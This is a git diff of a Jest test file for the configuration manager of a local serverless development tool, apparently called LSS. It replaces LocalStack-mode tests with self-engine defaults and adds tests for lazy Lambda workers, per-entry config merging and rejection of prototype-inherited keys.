@@ -4,6 +4,7 @@
 // and env overrides we mock fs, set process.env, then jest.resetModules() +
 // re-require to construct a fresh singleton under those conditions.
 import path from 'path';
+import { projectCacheSegment } from '../../../src/server/services/project-scope';
 
 jest.mock('fs');
 const fs = require('fs') as jest.Mocked<typeof import('fs')>;
@@ -39,6 +40,7 @@ const LSS_ENV_VARS = [
   'LSS_INVOKE_HOST',
   'LSS_ENGINE',
   'LSS_ENGINE_PORT',
+  'LSS_ENGINE_DATA_DIR',
   'HOME',
 ];
 
@@ -135,11 +137,11 @@ describe('loadConfig file precedence', () => {
   it('falls back to .lssrc in HOME', () => {
     const homeRc = path.join('/home/tester', '.lssrc');
     fs.existsSync.mockImplementation((p) => p === homeRc);
-    fs.readFileSync.mockReturnValue(JSON.stringify({ mode: 'external' }));
+    fs.readFileSync.mockReturnValue(JSON.stringify({ region: 'eu-west-3' }));
 
     const cm = freshConfigManager();
     expect(cm.getConfigPath()).toBe(homeRc);
-    expect(cm.getMode()).toBe('external');
+    expect(cm.getRegion()).toBe('eu-west-3');
   });
 
   it('uses ~ as the home base when HOME is unset', () => {
@@ -161,7 +163,7 @@ describe('loadConfig file precedence', () => {
     const cm = freshConfigManager();
     // Parse failed: no config loaded, configPath stays empty, defaults apply.
     expect(cm.getConfigPath()).toBe('');
-    expect(cm.getServerPort()).toBe(3100);
+    expect(cm.getServerPort()).toBe(14566);
     expect(console.warn).toHaveBeenCalled();
   });
 
@@ -192,63 +194,6 @@ describe('loadFromEnv overrides every variable', () => {
     expect(freshConfigManager().getServerPort()).toBe(5600);
   });
 
-  it('localstackPort', () => {
-    process.env.LSS_LOCALSTACK_PORT = '4567';
-    expect(freshConfigManager().getLocalStackPort()).toBe(4567);
-  });
-
-  it('localstackEndpoint', () => {
-    process.env.LSS_LOCALSTACK_ENDPOINT = 'http://ls:4566';
-    expect(freshConfigManager().getLocalStackEndpoint()).toBe('http://ls:4566');
-  });
-
-  it('mode managed (lowercased)', () => {
-    process.env.LSS_LOCALSTACK_MODE = 'MANAGED';
-    expect(freshConfigManager().getMode()).toBe('managed');
-  });
-
-  it('mode external', () => {
-    process.env.LSS_LOCALSTACK_MODE = 'external';
-    const cm = freshConfigManager();
-    expect(cm.getMode()).toBe('external');
-    expect(cm.isExternal()).toBe(true);
-  });
-
-  it('mode ignores invalid values', () => {
-    process.env.LSS_LOCALSTACK_MODE = 'bogus';
-    expect(freshConfigManager().getMode()).toBe('managed');
-  });
-
-  it('edition pro (lowercased)', () => {
-    process.env.LSS_LOCALSTACK_EDITION = 'PRO';
-    expect(freshConfigManager().getLocalStackEdition()).toBe('pro');
-  });
-
-  it('edition community', () => {
-    process.env.LSS_LOCALSTACK_EDITION = 'community';
-    expect(freshConfigManager().getLocalStackEdition()).toBe('community');
-  });
-
-  it('edition ignores invalid values', () => {
-    process.env.LSS_LOCALSTACK_EDITION = 'enterprise';
-    expect(freshConfigManager().getLocalStackEdition()).toBe('community');
-  });
-
-  it('localstackVersion', () => {
-    process.env.LSS_LOCALSTACK_VERSION = '3.0.0';
-    expect(freshConfigManager().getLocalStackVersion()).toBe('3.0.0');
-  });
-
-  it('localstackImage', () => {
-    process.env.LSS_LOCALSTACK_IMAGE = 'myrepo/ls:custom';
-    expect(freshConfigManager().getLocalStackImage()).toBe('myrepo/ls:custom');
-  });
-
-  it('localstackAuthToken', () => {
-    process.env.LOCALSTACK_AUTH_TOKEN = 'tok-123';
-    expect(freshConfigManager().getLocalStackAuthToken()).toBe('tok-123');
-  });
-
   it('enableDynamoProxy true', () => {
     process.env.LSS_ENABLE_DYNAMO_PROXY = 'true';
     expect(freshConfigManager().isEnableDynamoProxy()).toBe(true);
@@ -272,11 +217,6 @@ describe('loadFromEnv overrides every variable', () => {
   it('region from AWS_REGION', () => {
     process.env.AWS_REGION = 'ap-south-1';
     expect(freshConfigManager().getRegion()).toBe('ap-south-1');
-  });
-
-  it('services from LSS_SERVICES (comma split)', () => {
-    process.env.LSS_SERVICES = 'dynamodb,sqs';
-    expect(freshConfigManager().getServices()).toEqual(['dynamodb', 'sqs']);
   });
 
   it('persistence true', () => {
@@ -361,7 +301,7 @@ describe('getters: defaults (no file, no env)', () => {
   });
 
   it('getServerPort defaults to 3100', () => {
-    expect(cm.getServerPort()).toBe(3100);
+    expect(cm.getServerPort()).toBe(14566);
   });
 
   it('getServerPort reads PORT env at call time when config unset', () => {
@@ -370,39 +310,7 @@ describe('getters: defaults (no file, no env)', () => {
   });
 
   it('getDashboardPort aliases getServerPort', () => {
-    expect(cm.getDashboardPort()).toBe(3100);
-  });
-
-  it('getLocalStackPort defaults to 4566', () => {
-    expect(cm.getLocalStackPort()).toBe(4566);
-  });
-
-  it('getLocalStackEndpoint defaults from port', () => {
-    expect(cm.getLocalStackEndpoint()).toBe('http://localhost:4566');
-  });
-
-  it('getMode defaults to managed', () => {
-    expect(cm.getMode()).toBe('managed');
-  });
-
-  it('isExternal defaults to false', () => {
-    expect(cm.isExternal()).toBe(false);
-  });
-
-  it('getLocalStackEdition defaults to community', () => {
-    expect(cm.getLocalStackEdition()).toBe('community');
-  });
-
-  it('getLocalStackVersion defaults to latest', () => {
-    expect(cm.getLocalStackVersion()).toBe('latest');
-  });
-
-  it('getLocalStackImage defaults to community repo + latest', () => {
-    expect(cm.getLocalStackImage()).toBe('localstack/localstack:latest');
-  });
-
-  it('getLocalStackAuthToken defaults to undefined', () => {
-    expect(cm.getLocalStackAuthToken()).toBeUndefined();
+    expect(cm.getDashboardPort()).toBe(14566);
   });
 
   it('isEnableDynamoProxy defaults to false', () => {
@@ -420,10 +328,6 @@ describe('getters: defaults (no file, no env)', () => {
   it('getRegion reads AWS_REGION env at call time when config unset', () => {
     process.env.AWS_REGION = 'us-west-2';
     expect(cm.getRegion()).toBe('us-west-2');
-  });
-
-  it('getServices defaults to the standard list', () => {
-    expect(cm.getServices()).toEqual(['dynamodb', 'sqs', 'sns', 's3', 'lambda', 'events']);
   });
 
   it('isPersistence defaults to true', () => {
@@ -459,25 +363,11 @@ describe('getters: defaults (no file, no env)', () => {
   });
 
   it('getOrchestratorUrl uses the server port', () => {
-    expect(cm.getOrchestratorUrl()).toBe('http://localhost:3100');
+    expect(cm.getOrchestratorUrl()).toBe('http://localhost:14566');
   });
 });
 
 describe('getters: branch coverage on config-provided values', () => {
-  it('getLocalStackEndpoint returns the explicit endpoint when set', () => {
-    const cwdFile = path.join(process.cwd(), 'lss.config.json');
-    fs.existsSync.mockImplementation((p) => p === cwdFile);
-    fs.readFileSync.mockReturnValue(JSON.stringify({ localstackEndpoint: 'http://explicit:1' }));
-    expect(freshConfigManager().getLocalStackEndpoint()).toBe('http://explicit:1');
-  });
-
-  it('getLocalStackImage uses the pro repo for the pro edition', () => {
-    const cwdFile = path.join(process.cwd(), 'lss.config.json');
-    fs.existsSync.mockImplementation((p) => p === cwdFile);
-    fs.readFileSync.mockReturnValue(JSON.stringify({ localstackEdition: 'pro', localstackVersion: '3.0' }));
-    expect(freshConfigManager().getLocalStackImage()).toBe('localstack/localstack-pro:3.0');
-  });
-
   it('isEnableDynamoProxy honors the ENABLE_DYNAMO_PROXY env fallback ("true")', () => {
     process.env.ENABLE_DYNAMO_PROXY = 'TRUE';
     expect(freshConfigManager().isEnableDynamoProxy()).toBe(true);
@@ -604,6 +494,19 @@ describe('getPackageConfigForService', () => {
     });
   });
 
+  it('ignores a prototype-inherited key name masquerading as a service entry', () => {
+    // map['constructor'] resolves to Object.prototype.constructor on a plain
+    // read — the lookup must use hasOwnProperty or every service named
+    // "constructor"/"toString" would inherit a function as its config.
+    const cm = cmWith({ servicePackaging: {} });
+    expect(cm.getPackageConfigForService('/abs/constructor')).toEqual({
+      command: 'npx serverless package',
+      args: [],
+      env: {},
+      timeoutMs: 300000,
+    });
+  });
+
   it('matches a per-service override by relative path and it wins over basename', () => {
     const cm = cmWith({
       servicePackaging: {
@@ -668,12 +571,12 @@ describe('lambdaRuntime config', () => {
     return freshConfigManager();
   }
 
-  it('defaults: enabled, auto execution, offset 10000 and host.docker.internal invoke host', () => {
+  it('defaults: enabled, auto execution, offset 10000 and loopback invoke host', () => {
     const cm = freshConfigManager();
     expect(cm.isLambdaRuntimeEnabled()).toBe(true);
     expect(cm.getLambdaExecutionMode()).toBe('auto');
     expect(cm.getInvokePortOffset()).toBe(10000);
-    expect(cm.getInvokeHost()).toBe('host.docker.internal');
+    expect(cm.getInvokeHost()).toBe('127.0.0.1');
   });
 
   it('reads enabled/execution/invokePortOffset from the config file', () => {
@@ -696,6 +599,46 @@ describe('lambdaRuntime config', () => {
     expect(cm.isLambdaRuntimeEnabled()).toBe(true);
     expect(cm.getLambdaExecutionMode()).toBe('source');
     expect(cm.getInvokePortOffset()).toBe(10000);
+  });
+
+  // A worker per registered service costs ~48 MB resident, and LSS is a
+  // development stack: a handler is only resident while it is being used.
+  it('lazy defaults to true and idleTimeoutMs to one minute', () => {
+    const cm = freshConfigManager();
+    expect(cm.isLambdaRuntimeLazy()).toBe(true);
+    expect(cm.getLambdaIdleTimeoutMs()).toBe(60_000);
+  });
+
+  it('reads lazy/idleTimeoutMs from the config file', () => {
+    const cm = cmWith({ lambdaRuntime: { lazy: false, idleTimeoutMs: 900000 } });
+    expect(cm.isLambdaRuntimeLazy()).toBe(false);
+    expect(cm.getLambdaIdleTimeoutMs()).toBe(900000);
+  });
+
+  it('treats an explicit 0 or a bad value as "keep workers alive forever"', () => {
+    expect(cmWith({ lambdaRuntime: { idleTimeoutMs: 0 } }).getLambdaIdleTimeoutMs()).toBe(0);
+    expect(cmWith({ lambdaRuntime: { idleTimeoutMs: -1 } }).getLambdaIdleTimeoutMs()).toBe(0);
+    expect(cmWith({ lambdaRuntime: { idleTimeoutMs: 'soon' } as never }).getLambdaIdleTimeoutMs()).toBe(0);
+  });
+
+  // The ceiling is what makes host memory a function of services in flight
+  // rather than services registered.
+  it('maxWarmWorkers defaults to one per GB of RAM, clamped to 2..12', () => {
+    const totalmem = jest.spyOn(require('os'), 'totalmem');
+    totalmem.mockReturnValue(8 * 1024 ** 3);
+    expect(freshConfigManager().getLambdaMaxWarmWorkers()).toBe(8);
+    totalmem.mockReturnValue(1 * 1024 ** 3); // tiny host → floor of 2
+    expect(freshConfigManager().getLambdaMaxWarmWorkers()).toBe(2);
+    totalmem.mockReturnValue(64 * 1024 ** 3); // big host → cap of 12
+    expect(freshConfigManager().getLambdaMaxWarmWorkers()).toBe(12);
+    totalmem.mockRestore();
+  });
+
+  it('honors an explicit maxWarmWorkers, including 0 (no ceiling)', () => {
+    expect(cmWith({ lambdaRuntime: { maxWarmWorkers: 3 } }).getLambdaMaxWarmWorkers()).toBe(3);
+    expect(cmWith({ lambdaRuntime: { maxWarmWorkers: 0 } }).getLambdaMaxWarmWorkers()).toBe(0);
+    // Garbage falls back to the RAM-derived default rather than uncapping.
+    expect(cmWith({ lambdaRuntime: { maxWarmWorkers: -2 } }).getLambdaMaxWarmWorkers()).toBeGreaterThan(0);
   });
 
   it('LSS_LAMBDA_RUNTIME=true / "1" enables, anything else disables', () => {
@@ -781,6 +724,27 @@ describe('getRuntimeConfigForService', () => {
     });
   });
 
+  // Regression: the scan/dashboard key the operator writes must be the key the
+  // lookup reads. getProjectRoot() realpath-resolves (and falls back to the cwd
+  // for a home-directory config) while the config-relative key does not, so a
+  // checkout reached through a symlink used to make a saved override
+  // unreachable — silently ignored at registration and in the scan overlay.
+  it('resolves an entry keyed relative to the project root when the config path is a symlink', () => {
+    const linkDir = path.join(process.cwd(), 'link');
+    const realDir = path.join(process.cwd(), 'demo');
+    const cwdFile = path.join(linkDir, 'lss.config.json');
+    fs.existsSync.mockImplementation((p) => p === cwdFile);
+    fs.readFileSync.mockReturnValue(JSON.stringify({
+      serviceRuntime: { 'services/api': { apiPort: 4001 } },
+    }));
+    // `link` resolves to `demo`; the raw dirname does not.
+    fs.realpathSync.mockImplementation(((p: string) =>
+      (p === linkDir ? realDir : p)) as typeof fs.realpathSync);
+    process.env.LSS_CONFIG_PATH = cwdFile;
+    const cm = freshConfigManager();
+    expect(cm.getRuntimeConfigForService(path.join(realDir, 'services/api')).apiPort).toBe(4001);
+  });
+
   it('a relative-path key wins over a basename key', () => {
     const cm = cmWith({
       serviceRuntime: {
@@ -824,34 +788,26 @@ describe('getRuntimeConfigForService', () => {
 });
 
 describe('printSummary', () => {
-  it('prints a full summary in managed mode with dynamo proxy + auto package + config file', () => {
+  it('prints a full summary with dynamo proxy + auto package + config file', () => {
     const cwdFile = path.join(process.cwd(), 'lss.config.json');
     fs.existsSync.mockImplementation((p) => p === cwdFile);
     fs.readFileSync.mockReturnValue(
-      JSON.stringify({
-        mode: 'managed',
-        enableDynamoProxy: true,
-        autoPackage: true,
-        localstackAuthToken: 'secret',
-      }),
+      JSON.stringify({ enableDynamoProxy: true, autoPackage: true }),
     );
     const cm = freshConfigManager();
     expect(() => cm.printSummary()).not.toThrow();
     const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
     expect(out).toContain('Configuration Summary');
+    expect(out).toContain('Self Engine Port: 14566');
     expect(out).toContain('DynamoDB Proxy Port');
     expect(out).toContain('Package Command');
     expect(out).toContain('Config File');
-    expect(out).toContain('LocalStack Auth Token: set');
   });
 
-  it('prints a summary in external mode without image/proxy/package/config sections', () => {
-    process.env.LSS_LOCALSTACK_MODE = 'external';
+  it('omits the proxy/package/config sections when they are off', () => {
     const cm = freshConfigManager();
     expect(() => cm.printSummary()).not.toThrow();
     const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
-    // External mode skips the image/auth-token block.
-    expect(out).not.toContain('LocalStack Image');
     // No dynamo proxy → no proxy port line; no auto package → no command line.
     expect(out).not.toContain('DynamoDB Proxy Port');
     expect(out).not.toContain('Package Command');
@@ -880,13 +836,6 @@ describe('printSummary', () => {
     expect(out).not.toContain('super-secret');
   });
 
-  it('prints "not set" for the auth token when it is absent (managed mode)', () => {
-    const cm = freshConfigManager();
-    cm.printSummary();
-    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
-    expect(out).toContain('LocalStack Auth Token: not set');
-  });
-
   it('prints "Config Secrets: N" when the config declares a non-empty secrets map', () => {
     const cwdFile = path.join(process.cwd(), 'lss.config.json');
     fs.existsSync.mockImplementation((p) => p === cwdFile);
@@ -898,38 +847,14 @@ describe('printSummary', () => {
   });
 });
 
-describe('engine selection (self engine)', () => {
+
+describe('self engine configuration', () => {
   function cmWith(config: Record<string, unknown>): CM {
     const cwdFile = path.join(process.cwd(), 'lss.config.json');
     fs.existsSync.mockImplementation((p) => p === cwdFile);
     fs.readFileSync.mockReturnValue(JSON.stringify(config));
     return freshConfigManager();
   }
-
-  it('getEngineKind defaults to localstack', () => {
-    const cm = freshConfigManager();
-    expect(cm.getEngineKind()).toBe('localstack');
-    expect(cm.isSelfEngine()).toBe(false);
-  });
-
-  it('engine from the config file', () => {
-    expect(cmWith({ engine: 'self' }).getEngineKind()).toBe('self');
-  });
-
-  it('LSS_ENGINE env overrides the file (case-insensitive)', () => {
-    process.env.LSS_ENGINE = 'SELF';
-    expect(cmWith({ engine: 'localstack' }).getEngineKind()).toBe('self');
-  });
-
-  it('LSS_ENGINE accepts localstack', () => {
-    process.env.LSS_ENGINE = 'localstack';
-    expect(cmWith({ engine: 'self' }).getEngineKind()).toBe('localstack');
-  });
-
-  it('LSS_ENGINE ignores invalid values', () => {
-    process.env.LSS_ENGINE = 'bogus';
-    expect(freshConfigManager().getEngineKind()).toBe('localstack');
-  });
 
   it('LSS_ENGINE_PORT merges over the file selfEngine block', () => {
     process.env.LSS_ENGINE_PORT = '24566';
@@ -939,10 +864,23 @@ describe('engine selection (self engine)', () => {
     expect(resolved.account).toBe('111111111111');
   });
 
+  // Port + data dir from the environment is all a second instance needs: no
+  // config file to write, nothing shared with the dev stack.
+  it('LSS_ENGINE_DATA_DIR overrides the resolved dataDir', () => {
+    process.env.LSS_ENGINE_DATA_DIR = '/tmp/lss-run-7/engine';
+    const cm = cmWith({ engine: 'self', selfEngine: { dataDir: '/from/file' } });
+    expect(cm.getSelfEngineConfig().dataDir).toBe('/tmp/lss-run-7/engine');
+  });
+
   it('getSelfEngineConfig applies every default', () => {
-    const resolved = freshConfigManager().getSelfEngineConfig();
+    const cm = freshConfigManager();
+    const resolved = cm.getSelfEngineConfig();
     expect(resolved.port).toBe(14566);
-    expect(resolved.dataDir).toBe(path.join(require('os').homedir(), '.lss', 'engine'));
+    // With no stateDir the fallback root is scoped to this project — a flat
+    // ~/.lss/engine made every checkout on the machine share one engine state.
+    expect(resolved.dataDir).toBe(
+      path.join(require('os').homedir(), '.lss', 'projects', projectCacheSegment(cm.getProjectRoot()), 'engine'),
+    );
     expect(resolved.account).toBe('000000000000');
     expect(resolved.idleUnloadMs).toBe(300000);
     expect(resolved.memoryBudgetMb).toBe(128);
@@ -982,94 +920,40 @@ describe('engine selection (self engine)', () => {
     expect(cm.getSelfEngineConfig().dataDir).toBe(path.join('/abs/state', 'engine'));
   });
 
-  it('getEngineEndpoint follows the active engine', () => {
-    expect(freshConfigManager().getEngineEndpoint()).toBe('http://localhost:4566');
-    expect(cmWith({ engine: 'self', selfEngine: { port: 15000 } }).getEngineEndpoint())
+  it('getEngineEndpoint points at the self engine port', () => {
+    expect(freshConfigManager().getEngineEndpoint()).toBe('http://localhost:14566');
+    expect(cmWith({ selfEngine: { port: 15000 } }).getEngineEndpoint())
       .toBe('http://localhost:15000');
   });
 
-  it('printSummary in self mode shows engine lines and hides LocalStack lines', () => {
-    const cm = cmWith({
-      engine: 'self',
-      selfEngine: { fallbackEndpoint: 'http://localhost:4566' },
-    });
+  it('printSummary shows the engine lines', () => {
+    const cm = cmWith({ selfEngine: { fallbackEndpoint: 'http://legacy:4566' } });
     cm.printSummary();
     const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
-    expect(out).toContain('Engine: self');
     expect(out).toContain('Self Engine Port: 14566');
     expect(out).toContain('Self Engine Data Dir:');
-    expect(out).toContain('Self Engine Fallback: http://localhost:4566');
-    expect(out).not.toContain('LocalStack Mode');
+    expect(out).toContain('Self Engine Fallback: http://legacy:4566');
   });
 
-  it('printSummary in self mode omits the fallback line when unset', () => {
-    const cm = cmWith({ engine: 'self' });
+  it('printSummary omits the fallback line when unset', () => {
+    const cm = cmWith({});
     cm.printSummary();
     const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
-    expect(out).toContain('Engine: self');
+    expect(out).toContain('Self Engine Port:');
     expect(out).not.toContain('Self Engine Fallback');
   });
 
-  it('printSummary in localstack mode shows the engine kind and LocalStack lines', () => {
-    const cm = freshConfigManager();
-    cm.printSummary();
-    const out = (console.log as jest.Mock).mock.calls.map((c) => c.join(' ')).join('\n');
-    expect(out).toContain('Engine: localstack');
-    expect(out).toContain('LocalStack Mode: managed');
-  });
 });
 
-describe('getAossSidecarConfig', () => {
-  function cmWith(config: Record<string, unknown>): CM {
-    const cwdFile = path.join(process.cwd(), 'lss.config.json');
-    fs.existsSync.mockImplementation((p) => p === cwdFile);
-    fs.readFileSync.mockReturnValue(JSON.stringify(config));
-    return freshConfigManager();
-  }
-
-  it('defaults: enabled on the LocalStack engine, port 14567, dataDir under ~/.lss', () => {
-    const resolved = freshConfigManager().getAossSidecarConfig();
-    expect(resolved.enabled).toBe(true);
-    expect(resolved.port).toBe(14567);
-    expect(resolved.endpoint).toBe('http://localhost:14567');
-    expect(resolved.dataDir).toBe(path.join(require('os').homedir(), '.lss', 'aoss'));
-  });
-
-  it('defaults dataDir under stateDir when stateDir is set (test isolation)', () => {
-    const cm = cmWith({ stateDir: '/abs/state' });
-    expect(cm.getAossSidecarConfig().dataDir).toBe(path.join('/abs/state', 'aoss'));
-  });
-
-  it('aossSidecar.enabled false opts out', () => {
-    expect(cmWith({ aossSidecar: { enabled: false } }).getAossSidecarConfig().enabled).toBe(false);
-  });
-
-  it('an explicit enabled true stays on (LocalStack engine)', () => {
-    expect(cmWith({ aossSidecar: { enabled: true } }).getAossSidecarConfig().enabled).toBe(true);
-  });
-
-  it('a custom port flows into the endpoint', () => {
-    const resolved = cmWith({ aossSidecar: { port: 24567 } }).getAossSidecarConfig();
-    expect(resolved.port).toBe(24567);
-    expect(resolved.endpoint).toBe('http://localhost:24567');
-  });
-
-  it('the self engine forces enabled=false — it serves aoss natively', () => {
-    process.env.LSS_ENGINE = 'self';
-    const resolved = cmWith({ aossSidecar: { enabled: true } }).getAossSidecarConfig();
-    expect(resolved.enabled).toBe(false);
-  });
-});
-
-describe('getInvokeHost under the self engine', () => {
-  it('defaults to 127.0.0.1 in self mode (nothing runs in Docker)', () => {
+describe('getInvokeHost', () => {
+  it('defaults to 127.0.0.1 (nothing runs in a container)', () => {
     const cwdFile = path.join(process.cwd(), 'lss.config.json');
     fs.existsSync.mockImplementation((p) => p === cwdFile);
     fs.readFileSync.mockReturnValue(JSON.stringify({ engine: 'self' }));
     expect(freshConfigManager().getInvokeHost()).toBe('127.0.0.1');
   });
 
-  it('an explicit invokeHost still wins in self mode', () => {
+  it('an explicit invokeHost still wins', () => {
     const cwdFile = path.join(process.cwd(), 'lss.config.json');
     fs.existsSync.mockImplementation((p) => p === cwdFile);
     fs.readFileSync.mockReturnValue(
@@ -1193,10 +1077,10 @@ describe('reloadFromDisk', () => {
 
   it('picks up file changes; boot-materialized keys land in restartRequired, lazy keys do not', () => {
     fs.existsSync.mockImplementation((p) => p === cwdFile);
-    let content = JSON.stringify({ serverPort: 3100, seedsDir: './seeds' });
+    let content = JSON.stringify({ serverPort: 14566, seedsDir: './seeds' });
     fs.readFileSync.mockImplementation(() => content);
     const cm = freshConfigManager();
-    expect(cm.getServerPort()).toBe(3100);
+    expect(cm.getServerPort()).toBe(14566);
 
     content = JSON.stringify({ serverPort: 3200, seedsDir: './other-seeds' });
     const result = cm.reloadFromDisk();
@@ -1225,7 +1109,7 @@ describe('reloadFromDisk', () => {
     fs.existsSync.mockReturnValue(false);
     const result = cm.reloadFromDisk();
     expect(result.path).toBe('');
-    expect(cm.getServerPort()).toBe(3100);
+    expect(cm.getServerPort()).toBe(14566);
     expect(result.restartRequired).toEqual(['serverPort']);
   });
 
@@ -1297,16 +1181,30 @@ describe('updateConfig', () => {
     expect(err.details[0]).toContain('JSON object');
   });
 
-  it('rejects the blocked keys (auth token and secrets) and unknown keys', () => {
+  it('rejects the blocked secrets key and unknown keys', () => {
+    const err = updateErr(setupFile({}), { secrets: { a: 'x' }, bogusKey: 1 });
+    expect(err.details).toHaveLength(2);
+    expect(err.details[0]).toContain('"secrets" cannot be edited');
+    expect(err.details[1]).toContain('unknown config key "bogusKey"');
+  });
+
+  // 0.x's LocalStack keys are gone, not silently accepted: an old config that
+  // still carries them tells the user which ones to drop.
+  it('reports removed LocalStack keys as unknown', () => {
     const err = updateErr(setupFile({}), {
-      localstackAuthToken: 'tok',
-      secrets: { a: 'x' },
-      bogusKey: 1,
+      mode: 'external',
+      localstackPort: 4566,
+      localstackEdition: 'pro',
+      services: ['dynamodb'],
+      aossSidecar: { enabled: true },
     });
-    expect(err.details).toHaveLength(3);
-    expect(err.details[0]).toContain('"localstackAuthToken" cannot be edited');
-    expect(err.details[1]).toContain('"secrets" cannot be edited');
-    expect(err.details[2]).toContain('unknown config key "bogusKey"');
+    expect(err.details).toEqual([
+      'unknown config key "mode"',
+      'unknown config key "localstackPort"',
+      'unknown config key "localstackEdition"',
+      'unknown config key "services"',
+      'unknown config key "aossSidecar"',
+    ]);
   });
 
   it('aggregates every value-shape error instead of failing on the first', () => {
@@ -1316,8 +1214,6 @@ describe('updateConfig', () => {
       packageTimeoutMs: 0, // positiveInt
       persistence: 'yes', // boolean
       region: '', // empty string
-      mode: 'bogus', // enum
-      services: 'dynamodb,sqs', // stringArray (not an array)
       packageArgs: [1], // stringArray (non-string element)
       packageEnv: { A: 1 }, // stringRecord (non-string value)
       lambdaRuntime: [], // object (array is not a plain object)
@@ -1328,13 +1224,33 @@ describe('updateConfig', () => {
       '"packageTimeoutMs" must be a positive integer',
       '"persistence" must be a boolean',
       '"region" must be a non-empty string',
-      '"mode" must be one of: managed, external',
-      '"services" must be an array of strings',
       '"packageArgs" must be an array of strings',
       '"packageEnv" must be an object of string values',
       '"lambdaRuntime" must be an object',
     ]);
     expect(fs.writeFileSync).not.toHaveBeenCalled();
+  });
+
+  // idleTimeoutMs accepts 0 (meaning "never unload"), so it validates as
+  // nonNegativeInt rather than positiveInt.
+  it('rejects a value outside a subkey enum', () => {
+    expect(updateErr(setupFile({}), { lambdaRuntime: { execution: 'bogus' } }).details).toEqual([
+      '"lambdaRuntime.execution" must be one of: auto, artifact, source',
+    ]);
+    expect(updateErr(setupFile({}), { branding: { defaultTheme: 'sepia' } }).details).toEqual([
+      '"branding.defaultTheme" must be one of: dark, light',
+    ]);
+  });
+
+  it('rejects a negative or fractional idleTimeoutMs but accepts 0', () => {
+    expect(updateErr(setupFile({}), { lambdaRuntime: { idleTimeoutMs: -5 } }).details).toEqual([
+      '"lambdaRuntime.idleTimeoutMs" must be an integer >= 0',
+    ]);
+    expect(updateErr(setupFile({}), { lambdaRuntime: { idleTimeoutMs: 1.5 } }).details).toEqual([
+      '"lambdaRuntime.idleTimeoutMs" must be an integer >= 0',
+    ]);
+    const cm = setupFile({});
+    expect(() => cm.updateConfig({ lambdaRuntime: { idleTimeoutMs: 0 } })).not.toThrow();
   });
 
   it('validates subkeys of fixed-shape object blocks — garbage never reaches the file', () => {
@@ -1386,8 +1302,9 @@ describe('updateConfig', () => {
       selfEngine: { port: 15000, fsync: true, fallbackEndpoint: 'http://localhost:4566' },
       lambdaRuntime: { watch: null, execution: 'source' },
       servicePackaging: {
-        // packageArgs: null inside a map entry is tolerated by validation; the
-        // entry replaces wholesale and every consumer reads it through `??`.
+        // packageArgs: null inside a map entry is tolerated by validation and
+        // deletes that subkey when the entry merges (see the dedicated
+        // per-entry merge tests below).
         access: { packageCommand: 'npx sls package', packageEnv: { A: '1' }, packageArgs: null },
         billing: null,
       },
@@ -1409,18 +1326,16 @@ describe('updateConfig', () => {
     const result = cm.updateConfig({
       serverPort: 3200,
       region: 'eu-west-1',
-      mode: 'external',
-      services: ['dynamodb'],
       debug: true,
       packageTimeoutMs: 1000,
+      packageArgs: ['--param=custom-stage=offline'],
       packageEnv: { A: '1' },
     });
     expect(written()).toMatchObject({
       serverPort: 3200,
       region: 'eu-west-1',
-      mode: 'external',
-      services: ['dynamodb'],
       debug: true,
+      packageArgs: ['--param=custom-stage=offline'],
       packageTimeoutMs: 1000,
       packageEnv: { A: '1' },
       someCustomKey: true,
@@ -1432,7 +1347,7 @@ describe('updateConfig', () => {
     expect(cm.getRegion()).toBe('eu-west-1');
     expect(result.path).toBe(cwdFile);
     // Boot-materialized keys need stop/start; packageTimeoutMs/packageEnv are lazy.
-    expect(result.restartRequired).toEqual(['serverPort', 'mode', 'region', 'services', 'debug']);
+    expect(result.restartRequired).toEqual(['serverPort', 'region', 'debug']);
     expect(result.envOverridden).toEqual([]);
   });
 
@@ -1450,6 +1365,68 @@ describe('updateConfig', () => {
     });
     cm.updateConfig({ branding: { title: 'New', subtitle: null } });
     expect(written().branding).toEqual({ title: 'New', logo: './logo.svg' });
+  });
+
+  it('map blocks merge per entry: one service edit never drops another service or that entry\'s siblings', () => {
+    const cm = setupFile({
+      serviceRuntime: {
+        orders: { apiPort: 3631, execution: 'source' },
+        billing: { apiPort: 3632 },
+      },
+      servicePackaging: {
+        orders: { packageCommand: 'npm run pkg', packageEnv: { TOKEN: 's' } },
+      },
+    });
+    cm.updateConfig({
+      serviceRuntime: { orders: { apiPort: 4001, invokePort: 14001 } },
+      servicePackaging: { orders: { packageCommand: 'npx sls package' } },
+    });
+    expect(written().serviceRuntime).toEqual({
+      // execution survives the port edit; billing untouched.
+      orders: { apiPort: 4001, invokePort: 14001, execution: 'source' },
+      billing: { apiPort: 3632 },
+    });
+    // packageEnv (possibly secret) survives a command edit.
+    expect(written().servicePackaging).toEqual({
+      orders: { packageCommand: 'npx sls package', packageEnv: { TOKEN: 's' } },
+    });
+  });
+
+  it('map entries: null deletes a whole entry, null inside an entry deletes one subkey', () => {
+    const cm = setupFile({
+      serviceRuntime: {
+        orders: { apiPort: 3631, invokePort: 13631 },
+        billing: { apiPort: 3632 },
+      },
+    });
+    cm.updateConfig({ serviceRuntime: { billing: null, orders: { invokePort: null } } });
+    expect(written().serviceRuntime).toEqual({ orders: { apiPort: 3631 } });
+  });
+
+  it('drops an entry left empty by a delete, instead of writing a meaningless {}', () => {
+    // An empty entry is truthy, so it would shadow a basename-keyed entry for
+    // the same service and silently disable its override.
+    const cm = setupFile({ serviceRuntime: { orders: { apiPort: 3631 } } });
+    cm.updateConfig({ serviceRuntime: { orders: { apiPort: null } } });
+    expect(written().serviceRuntime).toEqual({});
+  });
+
+  it('rejects a prototype-inherited key name instead of writing it to the file', () => {
+    const cm = setupFile({});
+    for (const patch of [
+      { constructor: { anything: 1 } },
+      { serviceRuntime: { orders: { toString: 'junk' } } },
+      { branding: { hasOwnProperty: 'junk' } },
+    ]) {
+      expect(() => cm.updateConfig(patch as never)).toThrow(/unknown config key/);
+    }
+    expect(fs.writeFileSync).not.toHaveBeenCalled();
+  });
+
+  it('map entries replace a malformed existing entry that is not an object', () => {
+    const cm = setupFile({ serviceRuntime: { orders: 'broken' } });
+    cm.updateConfig({ serviceRuntime: { orders: { apiPort: 3631 } } });
+    expect(written().serviceRuntime).toEqual({ orders: { apiPort: 3631 } });
   });
 
   it('replaces an object block whose existing file value is not an object', () => {
